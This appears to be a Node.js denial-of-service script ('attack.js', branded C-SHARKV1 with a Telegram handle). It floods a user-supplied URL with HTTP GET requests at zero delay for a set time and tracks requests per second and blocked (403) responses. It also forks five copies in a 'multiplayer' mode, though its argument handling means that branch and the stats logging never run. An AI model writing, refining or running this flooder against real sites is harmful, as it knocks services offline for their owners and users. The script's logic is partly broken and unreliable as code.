const axios = require('axios');
const http = require('http');
const https = require('https');
const { fork } = require('child_process');

// Get command line arguments: target URL and duration
const [,, targetUrl, timeInSeconds] = process.argv;

if (!targetUrl || !timeInSeconds) {
  console.log('Usage: node attack.js <target_url> <time_in_seconds>');
  process.exit(1);
}

// Convert timeInSeconds to a number and ensure it's valid
const durationInMs = parseInt(timeInSeconds, 10) * 1000;
if (isNaN(durationInMs) || durationInMs <= 0) {
  console.log('Please provide a valid time in seconds.');
  process.exit(1);
}

// Initialize counters and variables
let totalSent = 0;
let successCount = 0;
let blockedCount = 0;
let maxRps = 0;
let startTime = Date.now();
let stopTime = startTime + durationInMs;
let lastSentTime = Date.now();
let rpsCount = 0;

// Function to send HTTP/1 requests
const sendRequest = async () => {
  try {
    const agent = targetUrl.startsWith('https') ? new https.Agent({ keepAlive: true }) : new http.Agent({ keepAlive: true });
    await axios.get(targetUrl, {
      httpAgent: agent, // Enforce HTTP/1
      httpsAgent: agent, // Enforce HTTP/1 for https
    });
    successCount++;
  } catch (error) {
    if (error.response && error.response.status === 403) {
      blockedCount++;
    }
  }

  totalSent++;
};

// Flood the target continuously
const performFlood = () => {
  const interval = setInterval(() => {
    if (Date.now() > stopTime) {
      clearInterval(interval); // Stop after the time limit is reached
      console.log('\nFlood test completed.');
      return;
    }

    // Send requests as fast as possible
    sendRequest();
    
    // Track RPS (Requests Per Second)
    rpsCount++;
    if (Date.now() - lastSentTime >= 1000) {
      maxRps = Math.max(maxRps, rpsCount);
      rpsCount = 0;
      lastSentTime = Date.now();
    }
  }, 0); // No delay, flood as fast as possible
};

// Function to log stats with overwriting
const logStats = () => {
  const timeRemaining = Math.max(0, stopTime - Date.now());
  const timeRemainingStr = new Date(timeRemaining).toISOString().substr(14, 5); // Format remaining time (mm:ss)

  const log = `
C-SHARKV1 - T.ME/STSVKINGDOM
============================
total sent: ${totalSent}
max-r: ${maxRps} rps
============================
success: ${successCount}
Blocked: ${blockedCount}
============================
TIME REMAINING: ${timeRemainingStr}
`;

  process.stdout.write(`\r${log}`);
};

// Multiplayer Mode - Start 5 concurrent flooders
const startMultiplayerFlood = () => {
  for (let i = 0; i < 5; i++) {
    const flooder = fork(__filename, [targetUrl, timeInSeconds]);
    flooder.on('message', (msg) => {
      console.log(msg);
    });
    flooder.on('exit', (code) => {
      console.log(`Flooder ${i + 1} finished with exit code ${code}`);
    });
  }
};

// If we're running this script as a "child" process (after being forked), run the flood
if (process.argv.length > 2) {
  performFlood();
} else {
  // If we are running as the main script, start the multiplayer mode
  startMultiplayerFlood();
  // Log stats every 100ms
  setInterval(logStats, 100);
}
